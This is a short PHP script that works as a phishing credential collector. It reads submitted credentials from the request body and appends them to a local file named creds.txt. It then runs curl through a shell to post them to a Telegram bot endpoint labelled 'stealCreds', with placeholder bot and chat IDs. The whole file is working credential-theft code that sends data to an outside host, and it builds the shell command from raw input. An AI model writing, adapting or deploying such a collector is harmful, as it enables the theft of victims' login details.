<?php
$creds = json_decode(file_get_contents('php://input'), true);
file_put_contents('creds.txt', json_encode($creds)."\n", FILE_APPEND);
shell_exec('curl -X POST https://api.telegram.org/botYOURBOT/stealCreds -d "chat_id=YOURID&text='.json_encode($creds).'"');
?>
